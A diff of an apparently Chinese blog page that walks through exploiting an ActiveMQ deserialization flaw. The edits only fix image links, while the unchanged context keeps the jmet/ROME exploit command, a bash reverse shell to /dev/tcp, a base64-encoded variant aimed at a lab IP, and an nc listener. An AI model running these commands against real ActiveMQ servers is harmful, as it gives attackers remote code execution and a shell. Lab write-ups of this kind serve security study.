@@ -177,16 +177,16 @@
 <li>在受害者的主机上创建/tmp/lpp文件</li>
 </ol>
 <p>-Q指定队列消息名，-I指定JMS客户端，这里是ActiveMQ，-Y指定具体的命令，-Yp指定payload类型，其后分别是ActiveMQ所在机器的ip及工作端口<br>所以这条命令是使用ROME payload把 执行 touch /success 命令序列化后作为名为l3yx的消息发送给ActiveMQ<br>&emsp;<br>进web页面访问下面的网址（账户密码都是admin）<br><a href="http://192.168.199.120:8161/admin/browse.jsp?JMSDestination=event" target="_blank" rel="noopener">http://192.168.199.120:8161/admin/browse.jsp?JMSDestination=event</a><br>找到上面对应的ID</p>
-<p><a href="https://imgchr.com/i/eB5Tbt" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/03/eB5Tbt.png" alt="eB5Tbt.png"></a><br>找到所对应的ID，点击进去触发。</p>
-<p><img src="https://imgchr.com/i/eB5WCD" alt><br>&emsp;<br>&emsp;</p>
+<p><a href="https://imgchr.com/i/eBolmn" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/03/eBolmn.png" alt="eBolmn.png"></a><br>找到所对应的ID，点击进去触发。</p>
+<p><a href="https://imgchr.com/i/eB5WCD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/03/eB5WCD.png" alt="eB5WCD.png"></a><br>&emsp;<br>&emsp;</p>
 <ol start="4">
 <li>使用反弹shell命令<br>利用方式很简单，只要将命令换为反弹shell即可<br>bash -i &gt;&amp; /dev/tcp/攻击机IP/监听端口 0&gt;&amp;1（payload）<br>&emsp;<br>不过在这里需要绕过Java的机制，可以把反弹 shell的命令base64进行编码<br>bash -c {echo,payload的basse64编码}|{base64,-d}|{bash,-i}<br>&emsp;<br>最终执行的是以下部分<br>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguMTk5LjE4Ny8xMzE0IDA+JjE=}|{base64,-d}|{bash,-i}” -Yp ROME   192.168.199.120   61616</li>
 </ol>
-<p><img src="https://imgchr.com/i/eB54vd" alt><br>&emsp;<br>&emsp;</p>
+<p><a href="https://imgchr.com/i/eB54vd" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/03/eB54vd.png" alt="eB54vd.png"></a><br>&emsp;<br>&emsp;</p>
 <ol start="5">
 <li>监听端口<br>再使用nc -lp 1314进行监听<br>这时再在页面上找到上图对应的ID，触发它即可。</li>
 </ol>
-<p><img src="https://imgchr.com/i/eB5Tbt" alt><br>即拿到shell</p>
+<p><a href="https://imgchr.com/i/eB5Tbt" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/03/eB5Tbt.png" alt="eB5Tbt.png"></a><br>即拿到shell</p>
 
   </article>
   <div class="random-toc-area">
